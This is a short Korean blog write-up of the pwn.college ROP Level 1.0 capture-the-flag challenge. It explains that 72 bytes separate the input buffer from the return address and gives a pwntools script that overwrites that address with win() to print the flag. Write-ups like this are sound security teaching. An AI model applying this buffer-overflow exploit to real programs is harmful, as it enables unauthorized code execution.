---
title: "[pwn.college] ROP Level1.0 Write up"
author: d0razi
date: 2023-08-06 20:30
categories: [InfoSec, Pwn]
tags: [linux, pwn.college]
image: /assets/img/media/banner/pwn-college.png
---


# 문제 분석

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.0/Untitled.png)

문제 파일을 실행시켜보면 위와 같이 문자열이 출력이 됩니다. 대충 해석해보면 win() 함수를 실행시키면 플래그가 출력된다고 하네요. 그리고 입력 버퍼부터 리턴 주소까지 72바이트 떨어져있다는 정보도 줍니다. 필요한 정보는 다 얻었으니 따로 분석은 할 필요가 없겠네요.

# Exploit code

```python
from pwn import *

p = process("/challenge/babyrop_level1.0")
e = ELF("/challenge/babyrop_level1.0")

pay = b'A' * 72
pay += p64(e.symbols["win"])

p.sendline(pay)
p.recvuntil(b"Leaving!")
p.interactive()
```

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level1.0/Untitled%201.png)